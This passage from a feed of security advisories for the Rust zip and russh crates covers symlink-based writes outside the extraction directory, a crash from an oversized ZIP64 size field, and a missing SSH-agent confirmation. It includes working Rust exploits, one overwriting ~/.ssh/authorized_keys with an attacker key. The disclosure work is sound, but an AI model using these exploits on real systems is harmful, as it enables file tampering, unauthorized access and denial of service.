The symlink branch received neither guard. A survey of `Vec::with_capacity` across `src/` finds exactly two sites sized from untrusted input: `src/read/mod.rs:401` and `src/read/stream.rs:73`.

References:
- https://github.com/zip-rs/zip2/security/advisories/GHSA-q7v9-x93c-xqv3 [WEB]
- https://nvd.nist.gov/vuln/detail/CVE-2026-115909 [ADVISORY]
- https://github.com/zip-rs/zip2/pull/984 [WEB]
- https://github.com/zip-rs/zip2/commit/a543a1fc8f3f3eef36f27bb137230295284cdb98 [WEB]
- https://github.com/zip-rs/zip2 [PACKAGE]
- https://github.com/zip-rs/zip2/releases/tag/v9.0.0 [WEB]

### GHSA-hjqx-j4rw-g7xv — zip: Arbitrary file write outside the extraction directory, because ZipArchive::extract validates symlink targets lexically. 
- Aliases: CVE-2026-115908 | Published: 2026-10-29 | Modified: 2026-10-29 | Severity: HIGH
- CWE: CWE-22, CWE-59, CWE-61
- CVSS_V3: `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H`
- Affected crates.io/zip: introduced:7.2.0 fixed:9.0.0

### Summary

- **Verified version:** zip `9.0.0-pre3`
- **Affected versions:** `7.2.0` and later
- **Precondition:** The attacker knows (or can guess) the absolute path of the extraction destination

The validation applied to symlinks is purely lexical.
As a result, an attacker can write arbitrary files outside the extraction directory through a symlink.
Exploitation requires the attacker to know (or guess) the absolute path of the destination, but this is realistic in practice: CI workspaces, `/opt/app`, a fixed Downloads path, and so on.

> **Impact extends further on Windows (verified on real hardware for both the separate-drive and UNC-share cases)**:  
> Because `simplified_components` discards the `Prefix` component, paths like `D:\<same tail as dest>` or a UNC path `\\attacker\share\<same tail>` pass the `starts_with` check.  
> As a result, `outpath.push` gets replaced onto a different drive/remote share, so **a single symlink is enough — no intermediate symlink chain is required**.  
> That said, creating a symlink on Windows requires `SeCreateSymbolicLinkPrivilege` (administrator rights or Developer Mode enabled).
> **Real-hardware verification (Windows 10 VM (19045.2604), `tests/poc_win.rs`)**:  
> With the extraction target set to a temporary directory under `C:`, both of the following paths returned `Ok(())` from `extract()` and successfully wrote outside the extraction target.  
> In both cases `extract()` returned no error (`Ok(())`), and it was confirmed that the contents of `pwned.txt` matched the attacker-specified value.

### Relationship to CVE-2025-29787

This is **not a duplicate** of the existing [CVE-2025-29787](https://github.com/zip-rs/zip2/security/advisories/GHSA-94vh-gphv-8pm8) (2025-03); rather, **the protection introduced for that CVE was subsequently lost**.

#### Timeline (git history, UTC)

| commit     | Date       | Description                                                                                                      |
| ---------- | ---------- | ---------------------------------------------------------------------------------------------------------------- |
| `d4539d6b` | 2025-02-28 | Initial fix for CVE-2025-29787. Canonicalizes output paths and symlink targets and verifies they descend from the destination |
| `0199ac2c` | 2025-03-15 | **Before the v2.3.0 release**, the above is replaced with a lexical check based on `simplified_components`         |
| `v2.3.0`   | 2025-03-16 | Released as the CVE fix. **What actually shipped is the lexical check**                                           |
| `d5cf4b55` | 2026-01-18 | Changes how `simplified_components` handles absolute paths, **from rejecting them to silently stripping them** (released in `v7.2.0`) |

#### Why v2.3.0 was not affected, and how the protection was lost

The `safe_prepare_path` in v2.3.0 performs essentially the same lexical check as the current code. However, `simplified_components` at that time **rejected any path containing an absolute component**, so an absolute symlink target was never accepted in the first place and this attack path did not work.

```rust
// v2.3.0: reject absolute paths
Component::Prefix(_) | Component::RootDir => return None,

// Current: ignore the fact that the path is absolute
Utf8WindowsComponent::Prefix(_) | Utf8WindowsComponent::RootDir => (),
```

`d5cf4b55` was intended to make archives containing absolute path names extractable, but as a side effect **absolute symlink targets now pass the lexical check**, which silently removed the protection against CVE-2025-29787.

#### Verification

The following three cases were compared using the same build (`9.0.0-pre3`):

| Payload / condition                                                        | Result                                                                                       |
| -------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------- |
| Original PoC for CVE-2025-29787 (relative symlink `parent -> ../`)          | **Blocked** with `Err(InvalidArchive("Invalid symlink target path"))` (the CVE fix itself is effective) |
| PoC in this report (two-stage symlink using absolute paths)                | **Succeeds** with `Ok(())`, writing outside the destination                                   |
| PoC in this report, with the `d5cf4b55` change reverted to `return None`   | **Blocked** with `Err(InvalidArchive("Invalid symlink target path"))`                          |

The first row shows that the fix for the CVE itself still works, confirming that this report is not a duplicate.
The third row confirms that this vulnerability originates from the change in `d5cf4b55`.

#### Differences from CVE-2025-29787

- **Stricter precondition:** This issue requires the absolute path of the destination to be known (`AC:H`). The CVE worked with a relative `../` and had no such precondition.
- **Narrower API surface:** This issue affects only `ZipArchive::extract` (and `extract_unwrapped_root_dir`). `ZipStreamReader::extract` is not affected, because `external_attributes` in the local header is `0` and therefore `is_symlink()` never returns true (the CVE affected both APIs).

### Details

#### Lexical validation of the path string

The symlink validation in `src/read/zipfile.rs: L290-345` is lexical.

**`src/read/zipfile.rs: fn safe_prepare_path` (L316-321):**
```rust
if !crate::path::simplified_components(&target)
    .ok_or(invalid!("Invalid symlink target path"))?
    .starts_with(
        &crate::path::simplified_components(base_path)
            .ok_or(invalid!("Invalid base path"))?,
    )
```

`simplified_components` discards the information that a path is **absolute (drive prefix / root)**, normalizes it lexically, and then merely performs a prefix comparison between the two results. It never looks at how the path actually resolves on the file system.

Consequently, the classic **Zip Slip** vector using `..` is blocked, but paths that involve symlink resolution are not.

**`src/path.rs: fn simplified_components` (L9~26):**
```rust
/// Simplify a path by removing the prefix and parent directories and only return normal components
pub(crate) fn simplified_components(input: &Path) -> Option<Vec<&OsStr>> {
    let mut out = Vec::new();
    let input_str = input.to_str()?;
    for component in Utf8WindowsPath::new(input_str).components() {
        match component {
            // Skip prefix and root directory components instead of rejecting the entire path
            // This allows extraction of ZIP files with absolute paths, similar to other ZIP tools
            Utf8WindowsComponent::Prefix(_) | Utf8WindowsComponent::RootDir => (),
            Utf8WindowsComponent::ParentDir => {
                out.pop()?;
            }
            Utf8WindowsComponent::Normal(s) => out.push(OsStr::new(s)),
            Utf8WindowsComponent::CurDir => (),
        }
    }
    Some(out)
}
```

#### Insufficient validation of `target`

Once the path check passes, **`src/read/zipfile.rs: fn safe_prepare_path` (L345)** performs `outpath.push(target)`, but **whether any intermediate component of `target` is itself a symlink is never checked**.

In addition, `make_symlink`, which is called from `extract_internal`, delegates to `make_symlink_impl` and only validates that the archive-supplied `target` is valid UTF-8.
There is no check that `target` stays inside the destination, so the symlink is created as-is.

**`src/read/mod.rs: fn extract_internal` (L396-406):**
```rust
#[cfg(any(unix, windows))]
if file.is_symlink() {
    let mut target = Vec::with_capacity(file.size() as usize);
    file.read_to_end(&mut target)?;
    drop(file);
    make_symlink(&outpath, &target, &self.shared.files)?;
    continue;
} else if file.is_dir() {
    make_writable_dir_all(&outpath)?;
    continue;
}
```

**`src/read/mod.rs: fn make_symlink_impl` (L57-90):**
```rust
#[cfg(unix)]
pub(crate) fn make_symlink_impl<T>(
    outpath: &Path,
    target_str: &str,
    _existing_files: &IndexMap<Box<[u8]>, T>,
) -> ZipResult<()> {
    std::os::unix::fs::symlink(Path::new(&target_str), outpath)?;
    Ok(())
}

#[cfg(windows)]
pub(crate) fn make_symlink_impl<T>(
    outpath: &Path,
    target_str: &str,
    existing_files: &IndexMap<Box<[u8]>, T>,
) -> ZipResult<()> {
    use crate::format::functions::is_dir;
    let target = Path::new(OsStr::new(&target_str));
    let target_is_dir_from_archive =
        is_dir(target_str.as_bytes()) && existing_files.contains_key(target_str.as_bytes());
    let target_is_dir = if target_is_dir_from_archive {
        true
    } else if let Ok(meta) = std::fs::metadata(target) {
        meta.is_dir()
    } else {
        false
    };
    if target_is_dir {
        std::os::windows::fs::symlink_dir(target, outpath)?;
    } else {
        std::os::windows::fs::symlink_file(target, outpath)?;
    }
    Ok(())
}
```

#### Contradiction with the doc comment

The documentation comment of `extract` at `src/read/mod.rs: L266-269` states the following.
In reality, however, there is no validation when a symlink is created, and **`canonicalize` is not used to validate symlink targets** (`canonicalize` is used only in **`src/read/mod.rs: fn extract_internal` (L357)**, to normalize the destination directory itself).

```rust
    /// Extract a Zip archive into a directory, overwriting files if they
    /// already exist. Paths are sanitized with [`ZipFile::enclosed_name`]. Symbolic links are only
    /// created and followed if the target is within the destination directory (this is checked
    /// conservatively using [`std::fs::canonicalize`]).
```

Combining the above makes it possible to write outside the destination during extraction:

| entry       | kind    | target                                                              |
| ----------- | ------- | ------------------------------------------------------------------- |
| b           | symlink | `/…/outside` (created without validation)                           |
| a           | symlink | `<dest>/b/sub` (lexically under dest, so it passes the check)       |
| a/pwned.txt | file    | -                                                                   |

Entries are processed in central directory order (`for i in 0..self.len()` at `src/read/mod.rs: L386`), so the order above (`b` -> `a` -> `a/pwned.txt`) is required.

Extraction then proceeds as follows:

1. `b`: without any validation, the symlink `<dest>/b -> /…/outside`, **pointing outside the destination**, is created.
2. `a`: likewise without validation, `<dest>/a -> <dest>/b/sub` is created.
3. `a/pwned.txt`: when `safe_prepare_path` processes the component `a`, it sees that `<dest>/a` is a symlink and validates its target (`<dest>/b/sub`). Lexically that target is under `<dest>`, so the check passes and `outpath` becomes `<dest>/b/sub`.
   - At this point, **the fact that `b`, an intermediate component of the target, is a symlink pointing outside is never re-validated**.
   - Because `a` is not the final component, `make_writable_dir_all` is called and creates `<dest>/b/sub` (which really is `/…/outside/sub`).
4. Finally `File::create` creates `<dest>/b/sub/pwned.txt`; the kernel resolves `b` and writes to **`/…/outside/sub/pwned.txt`**. `extract()` returns `Ok(())`.

### PoC

The PoC below is written as a unit test.
Place it at `tests/poc_linux.rs` and run `cargo test --test poc_linux -- --nocapture` to reproduce.

- `zip_slip_via_symlink`: Write a new file outside the extraction destination
- `overwrite_existing_ssh_authorized_keys`: Overwrite an existing file ~/.ssh/authorized_keys outside the extraction destination

`tests/poc_linux.rs`
```rust
//! PoC for Linux: Write outside the extraction directory via symlink (GHSA-hjqx-j4rw-g7xv)
//!
//! - author: sl91994
//! 
//! Mechanism: The symlink target validation is lexical (prefix matching in `simplified_components`)
//! By placing an outward-pointing symlink `b` as an "intermediate component in the resolved path", `b` is traversed by the OS rather than the validation loop, thus escaping outside without being verified.
//! Can be reproduced with `cargo test --test poc_linux -- --nocapture`

#![cfg(unix)]

use std::fs;
use std::io::{Cursor, Write};
use tempfile::TempDir;
use zip::write::SimpleFileOptions;
use zip::{ZipArchive, ZipWriter};

/// Verification of writing a new file outside the extraction destination
#[test]
fn zip_slip_via_symlink() {
    let tmp = TempDir::new().unwrap();
    let dest = tmp.path().join("dest"); // Extraction destination
    let outside = tmp.path().join("outside"); // A location where writing should not be allowed
    fs::create_dir(&dest).unwrap();
    fs::create_dir(&outside).unwrap();

    // Construct a malicious ZIP
    let mut zip = ZipWriter::new(Cursor::new(Vec::new()));
    let opt = SimpleFileOptions::default();
    // b: Symlink pointing outside (target is created unverified)
    zip.add_symlink("b", outside.to_str().unwrap(), opt).unwrap();
    // a: Symlink whose target starts under dest (passes lexical validation)
    zip.add_symlink("a", dest.join("b/sub").to_str().unwrap(), opt).unwrap();
    // a/pwned.txt: File that escapes outside dest by traversing the intermediate b
    zip.start_file("a/pwned.txt", opt).unwrap();
    zip.write_all(b"escaped!").unwrap();
    let archive = zip.finish_into_readable().unwrap();

    ZipArchive::from(archive).extract(&dest).unwrap();

    // Verification: File has been written outside dest
    let escaped = outside.join("sub/pwned.txt");
    assert!(escaped.exists(), "escape failed");
    assert_eq!(fs::read_to_string(&escaped).unwrap(), "escaped!");
    println!("wrote outside dest: {}", escaped.display());
}

/// Verification of overwriting an existing file (~/.ssh/authorized_keys) outside the extraction destination
#[test]
fn overwrite_existing_ssh_authorized_keys() {
    let tmp = TempDir::new().unwrap();
    let dest = tmp.path().join("dest"); // Extraction destination

    // Reproduce victim's existing ~/.ssh/authorized_keys (containing a legitimate key)
    let home = tmp.path().join("home_victim");
    let ssh = home.join(".ssh");
    fs::create_dir_all(&ssh).unwrap();
    let authorized_keys = ssh.join("authorized_keys");
    fs::write(&authorized_keys, "ssh-ed25519 AAAA...LEGIT victim@host\n").unwrap();
    let original = fs::read_to_string(&authorized_keys).unwrap();

    fs::create_dir(&dest).unwrap();

    // Construct a malicious ZIP
    let mut zip = ZipWriter::new(Cursor::new(Vec::new()));
    let opt = SimpleFileOptions::default();
    // b: Outward-pointing symlink to victim's HOME (target unverified)
    // Because it's placed in the middle rather than at the end, the OS traverses it transparently, bypassing validation
    zip.add_symlink("b", home.to_str().unwrap(), opt).unwrap();
    // a: Symlink pointing to <dest>/b/.ssh (passes validation because it is lexically under dest)
    zip.add_symlink("a", dest.join("b/.ssh").to_str().unwrap(), opt).unwrap();
    // a/authorized_keys: File entry that reaches the actual authorized_keys
    zip.start_file("a/authorized_keys", opt).unwrap();
    zip.write_all(b"ssh-ed25519 AAAA...ATTACKER attacker@evil\n").unwrap();
    let archive = zip.finish_into_readable().unwrap();

    // extract() returns Ok(()) without an error (the caller cannot detect it)
    let res = ZipArchive::from(archive).extract(&dest);
    println!("extract() returned: {:?}", res);
    res.unwrap();

    // Verification: Existing file is overwritten with the attacker's content
    let after = fs::read_to_string(&authorized_keys).unwrap();
    println!("--- BEFORE ---\n{original}--- AFTER ---\n{after}");
    assert_ne!(after, original, "file was NOT overwritten");
    assert!(after.contains("ATTACKER"), "attacker content not present");
    println!("OVERWROTE existing file: {}", authorized_keys.display());
}
```

#### Windows PoC (`tests/poc_win.rs`)

This is a test that verifies **escape to a different drive / UNC share via a single symlink**, specific to Windows.
By setting the extraction destination to a temporary directory on `C:` and making the symlink target **an absolute path on a different volume that shares the same tail as dest**, it passes the lexical check in `simplified_components` (which discards the `Prefix`), and the drive/share substitution performed by `outpath.push` results in a write outside of `dest`.

- `escape_via_second_drive`: writes to `E:\<same tail as dest>\evil\pwned.txt` on a separate drive (e.g. `E:`)
- `escape_via_unc_share`: writes to `\\localhost\poc\<same tail as dest>\evil\pwned.txt` on a UNC share (e.g. `\\localhost\poc\`)

```rust
//! Windows PoC: writing to a separate drive / UNC share via a single symlink (GHSA-hjqx-j4rw-g7xv)
//!
//! - author: sl91994
//!
//! The crafted ZIP contains only 2 entries:
//!   1. `a`          : a symlink whose target = `<OTHER>\<same tail as dest>\evil` (absolute path)
//!   2. `a/pwned.txt`: a regular file
//! During extraction, resolving `a` causes outpath to be replaced with `<OTHER>\...\evil`,
//! and `File::create(<OTHER>\...\evil\pwned.txt)` writes outside of dest.
//!
//! # Prerequisites
//! - Windows 10 (build 14972+) through Windows 11
//! - Symlink creation privilege `SeCreateSymbolicLinkPrivilege` = Developer Mode enabled, or run as Administrator.
//! - One volume / share **separate from dest**.
//!   Supply the escape destination via environment variables:
//!     * `POC_OTHER_DRIVE`: root of a separate drive. Must end with `\`. e.g. `D:\`
//!     * `POC_UNC_SHARE`: root of a writable UNC share. Must end with `\`.
//!       e.g. `\\localhost\poc\`
//!       (`net share poc=C:\path\to\share /grant:%USERNAME%,FULL`)
//!
//! # Running
//!
//! ```powershell
//! $env:POC_OTHER_DRIVE = "D:\"
//! $env:POC_UNC_SHARE   = "\\localhost\poc\"
//! cargo test --test poc_win -- --nocapture
//! ```

#![cfg(windows)]

use std::ffi::OsString;
use std::fs;
use std::io::{Cursor, Write};
use std::path::{Component, Path, PathBuf};

use tempfile::TempDir;
use zip::write::SimpleFileOptions;
use zip::{ZipArchive, ZipWriter};

/// Whether we have the privilege needed to create symlinks
fn have_symlink_privilege() -> bool {
    let Ok(tmp) = TempDir::new() else {
        return false;
    };
    let target = tmp.path().join("privcheck_target");
    let link = tmp.path().join("privcheck_link");
    if fs::write(&target, b"x").is_err() {
        return false;
    }
    std::os::windows::fs::symlink_file(&target, &link).is_ok()
}

/// Extract only the Normal components of a path (the tail, with prefix / root dropped)
fn normal_tail(p: &Path) -> Vec<OsString> {
    p.components()
        .filter_map(|c| match c {
            Component::Normal(s) => Some(s.to_os_string()),
            _ => None,
        })
        .collect()
}

/// Returns the `Prefix` (volume identifier) at the head of the path
fn volume_prefix(p: &Path) -> Option<OsString> {
    match p.components().next() {
        Some(Component::Prefix(pre)) => Some(pre.as_os_str().to_os_string()),
        _ => None,
    }
}

/// Verifies the single-symlink escape using the escape destination root `other_root` (a separate volume / share)
fn run_escape(variant: &str, other_root: &str) {
    if !have_symlink_privilege() {
        eprintln!(
            "[SKIP] [{variant}] missing SeCreateSymbolicLinkPrivilege; \
             enable Developer Mode or run as Administrator."
        );
        return;
    }

    // other_root must be an existing, writable root
    let other_root_path = PathBuf::from(other_root);
    if !fs::metadata(&other_root_path)
        .map(|m| m.is_dir())
        .unwrap_or(false)
    {
        eprintln!(
            "[SKIP] [{variant}] escape root {other_root:?} does not exist or is not a \
             directory; check the environment variable."
        );
        return;
    }

    // The extraction destination `dest` is a temp directory (usually on C:). Since the `base` used by
    // safe_prepare_path is the path after canonicalize, match the tail to that.
    let tmp = TempDir::new().unwrap();
    let dest = tmp.path().join("dest");
    fs::create_dir(&dest).unwrap();
    let canon_dest = fs::canonicalize(&dest).unwrap();
    let tail = normal_tail(&canon_dest);

    // Reproduce dest's tail on a separate volume as the escape destination, with evil/ underneath it.
    // Since simplified_components discards the prefix, the target's tail component sequence
    // prefix-matches the base's tail component sequence, passing the lexical check.
    let mut escape_dir = other_root_path.clone();
    for c in &tail {
        escape_dir.push(c);
    }
    escape_dir.push("evil");

    // Confirm it's actually a separate volume (if it's the same volume, it would land inside dest and not be an escape)
    let other_vol = fs::canonicalize(&other_root_path)
        .ok()
        .and_then(|p| volume_prefix(&p));
    let dest_vol = volume_prefix(&canon_dest);
    assert_ne!(
        other_vol, dest_vol,
        "[{variant}] escape root {other_root:?} is on the same volume as dest; \
         point it at a different drive/share (dest vol={dest_vol:?})."
    );

    // Assemble the crafted ZIP (entries: 1 symlink + 1 file)
    let target_str = escape_dir
        .to_str()
        .expect("escape path must be valid UTF-8")
        .to_string();
    println!("[{variant}] dest (canonical) = {}", canon_dest.display());
    println!("[{variant}] symlink target   = {target_str}");

    let mut zip = ZipWriter::new(Cursor::new(Vec::new()));
    let opt = SimpleFileOptions::default();
    // a: an absolute symlink pointing to the separate drive/share (passes the lexical check via matching tail)
    zip.add_symlink("a", &target_str, opt).unwrap();
    // a/pwned.txt: resolving `a` substitutes the drive in outpath, causing the write to land outside dest
    zip.start_file("a/pwned.txt", opt).unwrap();
    zip.write_all(b"escaped-on-windows!").unwrap();
    let archive = zip.finish_into_readable().unwrap();

    let res = ZipArchive::from(archive).extract(&dest);
    println!("[{variant}] extract() returned: {res:?}");

    res.expect("extract() failed");

    let escaped = escape_dir.join("pwned.txt");
    assert!(
        escaped.exists(),
        "[{variant}] escape failed: {} was not created",
        escaped.display()
    );

    let content = fs::read_to_string(&escaped).unwrap();
    println!(
        "[{variant}] WROTE OUTSIDE DEST: {} = {content:?}",
        escaped.display()
    );

    let _ = fs::remove_file(&escaped);
    let _ = fs::remove_dir(&escape_dir);

    assert_eq!(
        content, "escaped-on-windows!",
        "[{variant}] written content mismatch",
    );
}

/// Single-symlink escape to a separate drive (`POC_OTHER_DRIVE`, e.g. `D:\`)
#[test]
fn escape_via_second_drive() {
    match std::env::var("POC_OTHER_DRIVE") {
        Ok(root) if !root.is_empty() => run_escape("drive", &root),
        _ => eprintln!(
            "[SKIP] escape_via_second_drive: POC_OTHER_DRIVE not set \
             (PowerShell: `$env:POC_OTHER_DRIVE=\"D:\\\"`)."
        ),
    }
}

/// Single-symlink escape to a UNC share (`POC_UNC_SHARE`, e.g. `\\localhost\poc\`)
#[test]
fn escape_via_unc_share() {
    match std::env::var("POC_UNC_SHARE") {
        Ok(root) if !root.is_empty() => run_escape("unc", &root),
        _ => eprintln!(
            "[SKIP] escape_via_unc_share: POC_UNC_SHARE not set \
             (PowerShell: `$env:POC_UNC_SHARE=\"\\\\localhost\\poc\\\"`)."
        ),
    }
}
```

### Impact

With the privileges of the process that extracts an untrusted ZIP archive via `ZipArchive::extract` / `ZipArchive::extract_unwrapped_root_dir`, an attacker can **write a file with arbitrary contents to an arbitrary path outside the extraction directory**.

- Because existing files can be overwritten, tampering with files such as `~/.ssh/authorized_keys`, `~/.bashrc`, `.git/hooks/*`, CI configuration, or a service's binaries and configuration files **may lead to remote code execution or privilege escalation**. Destroying critical files can also cause denial of service.
- Extraction **does not fail and returns `Ok(())`**, so the caller has no straightforward way to detect the attack.
- The documentation of `extract()` explicitly states that **symbolic links are only created and followed if the target is within the destination directory**, so downstream applications that rely on this as a sandbox boundary are directly affected.

Exploitation requires the absolute path of the destination to be known, but this is realistic in practice: CI workspaces, `/opt/<app>`, a fixed Downloads directory, and so on.

References:
- https://github.com/zip-rs/zip2/security/advisories/GHSA-hjqx-j4rw-g7xv [WEB]
- https://nvd.nist.gov/vuln/detail/CVE-2026-115908 [ADVISORY]
- https://github.com/zip-rs/zip2/commit/09c030eab56e8db8fb3c1c33f554407b30bad8fa [WEB]
- https://github.com/zip-rs/zip2 [PACKAGE]
- https://github.com/zip-rs/zip2/releases/tag/v9.0.0 [WEB]

### GHSA-9hj8-73fh-9963 — zip: legacy Shrink/Reduce/Implode decoder: denial of service from attacker-controlled ZIP64 uncompressed size
- Aliases: CVE-2026-115907 | Published: 2026-10-29 | Modified: 2026-10-29 | Severity: HIGH
- CWE: CWE-400, CWE-789
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- Affected crates.io/zip: introduced:5.1.0 fixed:9.0.0

### Summary

A malicious 149-byte ZIP archive can cause a denial of service in applications that enable `legacy-zip` and use `ZipArchive::extract()`. An attacker-controlled ZIP64 uncompressed size triggers a `capacity overflow` panic in the Shrink decoder in optimized builds, potentially terminating the affected process.

### Details

When reading a Shrink-compressed entry, `ShrinkDecoder::read()` buffers the compressed input and reserves output capacity using the entry's declared uncompressed size:

```rust
if !self.stream_read {
    self.stream_read = true;
    let mut compressed_bytes = Vec::new();
    self.compressed_reader.read_to_end(&mut compressed_bytes)?;
    self.stream.reserve(self.uncompressed_size as usize);
    hwunshrink(
        &compressed_bytes,
        self.uncompressed_size as usize,
        &mut self.stream,
    )?;
}
```

In version 8.6.0, this is located in [`src/legacy/shrink.rs`](https://github.com/zip-rs/zip2/blob/771dfc534d2614158af5497ea3dff4d4208d7db1/src/legacy/shrink.rs#L341-L352). The vulnerable legacy codecs are compiled when the `legacy-zip` Cargo feature is enabled.

`self.uncompressed_size` is populated from ZIP metadata. For ZIP64 entries, an attacker can set it to a 64-bit value independently of the archive's actual compressed payload size. The PoC declares an uncompressed size of `u64::MAX`, while supplying only one byte of compressed data.

The reserve occurs before `hwunshrink()` can validate or decode the compressed stream. Consequently, the impossible capacity causes a deterministic `capacity overflow` panic instead of returning a normal archive or I/O error. The behavior also occurs in optimized release builds and is reachable through `ZipArchive::extract()`.

The same unbounded allocation pattern is present in the legacy Reduce and Implode decoder implementations. This PoC specifically demonstrates the Shrink path.

### PoC

Create a new Cargo project with the following layout:

```text
zip2-legacy-poc/
|-- Cargo.toml
`-- src/
    `-- main.rs
```

Use this `Cargo.toml`:

```toml
[package]
name = "zip2-legacy-poc"
version = "0.1.0"
edition = "2024"
publish = false

[dependencies]
tempfile = "3"
zip = { version = "=8.6.0", features = ["legacy-zip"] }
```

Use this `src/main.rs`:

```rust
use std::fs::File;
use std::io::{Cursor, Write};

fn push16(out: &mut Vec<u8>, value: u16) {
    out.extend_from_slice(&value.to_le_bytes());
}

fn push32(out: &mut Vec<u8>, value: u32) {
    out.extend_from_slice(&value.to_le_bytes());
}

fn push64(out: &mut Vec<u8>, value: u64) {
    out.extend_from_slice(&value.to_le_bytes());
}

fn zip64_extra() -> Vec<u8> {
    let mut extra = Vec::new();
    push16(&mut extra, 0x0001);
    push16(&mut extra, 16);
    push64(&mut extra, u64::MAX);
    push64(&mut extra, 1);
    extra
}

fn archive() -> Vec<u8> {
    let name = b"entry";
    let extra = zip64_extra();
    let mut out = Vec::new();

    push32(&mut out, 0x0403_4b50);
    push16(&mut out, 45);
    push16(&mut out, 0);
    push16(&mut out, 1); // Shrink compression.
    push16(&mut out, 0);
    push16(&mut out, 0);
    push32(&mut out, 0);
    push32(&mut out, u32::MAX);
    push32(&mut out, u32::MAX);
    push16(&mut out, name.len() as u16);
    push16(&mut out, extra.len() as u16);
    out.extend_from_slice(name);
    out.extend_from_slice(&extra);
    out.push(0);

    let central_start = out.len() as u32;

    push32(&mut out, 0x0201_4b50);
    push16(&mut out, 45);
    push16(&mut out, 45);
    push16(&mut out, 0);
    push16(&mut out, 1); // Shrink compression.
    push16(&mut out, 0);
    push16(&mut out, 0);
    push32(&mut out, 0);
    push32(&mut out, u32::MAX);
    push32(&mut out, u32::MAX);
    push16(&mut out, name.len() as u16);
    push16(&mut out, extra.len() as u16);
    push16(&mut out, 0);
    push16(&mut out, 0);
    push16(&mut out, 0);
    push32(&mut out, 0);
    push32(&mut out, 0);
    out.extend_from_slice(name);
    out.extend_from_slice(&extra);

    let central_size = out.len() as u32 - central_start;

    push32(&mut out, 0x0605_4b50);
    push16(&mut out, 0);
    push16(&mut out, 0);
    push16(&mut out, 1);
    push16(&mut out, 1);
    push32(&mut out, central_size);
    push32(&mut out, central_start);
    push16(&mut out, 0);
    out
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let bytes = archive();
    File::create("poc.zip")?.write_all(&bytes)?;

    let mut archive = zip::ZipArchive::new(Cursor::new(bytes))?;
    let entry = archive.by_index(0)?;

    println!(
        "method={:?} declared_size={}",
        entry.compression(),
        entry.size()
    );

    drop(entry);

    let output = tempfile::tempdir()?;
    archive.extract(output.path())?;
    Ok(())
}
```

Run the reproducer in release mode:

```sh
cd zip2-legacy-poc
RUST_BACKTRACE=1 cargo run --release
```

Observed output with `zip` 8.6.0 on `x86_64-unknown-linux-gnu`:

```text
method=Shrink declared_size=18446744073709551615

thread 'main' panicked at .../alloc/src/raw_vec/mod.rs:
capacity overflow
```

The backtrace reaches the Shrink decompressor through `std::io::copy` and `ZipArchive::extract_internal()`. The process exits with status 101. The program also writes the generated 149-byte archive to `poc.zip` before triggering extraction.

### Impact

Applications that enable `legacy-zip` and pass attacker-supplied ZIP files to the following extraction API can be forced to panic before the compressed entry is validated or decoded. An unhandled panic may terminate the archive-processing process and cause a denial of service.

- `zip::read::ZipArchive::extract`

References:
- https://github.com/zip-rs/zip2/security/advisories/GHSA-9hj8-73fh-9963 [WEB]
- https://nvd.nist.gov/vuln/detail/CVE-2026-115907 [ADVISORY]
- https://github.com/zip-rs/zip2/pull/991 [WEB]
- https://github.com/zip-rs/zip2/commit/8b4991288b79ad11cce201c2d785d5baa795bd3e [WEB]
- https://github.com/zip-rs/zip2 [PACKAGE]
- https://github.com/zip-rs/zip2/releases/tag/v9.0.0 [WEB]

### GHSA-vp5q-ff62-jwqv — russh: Agent server never calls `Agent::confirm`, so keys added with the confirm constraint (`ssh-add -c`) sign without confirmation
- Aliases: CVE-2026-116794 | Published: 2026-10-30 | Modified: 2026-10-30 | Severity: HIGH
- CWE: CWE-862
- CVSS_V4: `CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:H/SI:H/SA:N`
- Affected crates.io/russh: introduced:0 fixed:0.65

### Summary

The agent server in `russh::keys::agent::server` never calls `Agent::confirm` before signing with a key that was added with the confirm constraint. That constraint is `SSH_AGENT_CONSTRAIN_CONFIRM` (RFC 9987 §5.2.7.2), which is what `ssh-add -c` sends.

The call was replaced by a hard-coded `true` in 3e04597 ("Native async traits encore", #455), first released in 0.50.0-beta.12. Every release since, up to and including 0.64.1, signs requests for confirm-constrained keys without asking the `Agent` implementation. A user who added a key with `-c` is therefore never asked to confirm.

### Details

`Connection::try_sign` notes that the key needs confirmation, then awaits a ready future instead of the agent ([server.rs L348-L360 at v0.64.1](https://github.com/Eugeny/russh/blob/e5d80a07dc554480b6ea3b2e14adfc190407b627/russh/src/keys/agent/server.rs#L348-L360)):

```rust
let agent = if needs_confirm {
    let (agent, ok) = {
        let _pk = key.clone();
        Box::new(futures::future::ready((agent, true)))
    }
    .await;
    if !ok {
        return Ok((agent, false));
    }
    agent
} else {
    agent
};
```

Before [3e04597](https://github.com/Eugeny/russh/commit/3e04597dc54e36bfc85c21996f7d8d9d224e9826) the first statement was `let (agent, ok) = agent.confirm(key.clone()).await;`.

`try_sign` was checked in the published crates on crates.io:
- Every russh release from 0.50.0-beta.12 to 0.64.1 (52 versions) has the hard-coded `true`.
- russh 0.50.0-beta.8 to beta.11 call `agent.confirm`.
- Earlier russh releases have no agent server. It lived in russh-keys, and no russh-keys release is affected.

Not affected:
- `Agent` implementations that keep the default `confirm`, which returns `true` anyway.
- Checks made in `Agent::confirm_request`, which is still called with `MessageType::Sign` for every sign request ([L158-L159](https://github.com/Eugeny/russh/blob/e5d80a07dc554480b6ea3b2e14adfc190407b627/russh/src/keys/agent/server.rs#L158-L159)).
- The agent client, and the SSH client and server.

### PoC

1. Add this test to `mod test` in `russh/src/keys/mod.rs`. It uses the module's existing `Incoming` helper and `ED25519_KEY`.
2. Run `cargo test -p russh --lib keys::test::test_agent_confirms_keys_added_with_the_confirm_constraint`.

```rust
#[tokio::test]
#[cfg(unix)]
async fn test_agent_confirms_keys_added_with_the_confirm_constraint() {
    use std::sync::atomic::{AtomicUsize, Ordering};

    // An agent whose user refuses every confirmation prompt.
    #[derive(Clone)]
    struct Refuse(std::sync::Arc<AtomicUsize>);
    impl agent::server::Agent for Refuse {
        fn confirm(
            self,
            _: std::sync::Arc<PrivateKey>,
        ) -> Box<dyn Future<Output = (Self, bool)> + Send + Unpin> {
            self.0.fetch_add(1, Ordering::SeqCst);
            Box::new(futures::future::ready((self, false)))
        }
    }

    let prompts = std::sync::Arc::new(AtomicUsize::new(0));
    let dir = tempfile::tempdir().unwrap();
    let agent_path = dir.path().join("agent");
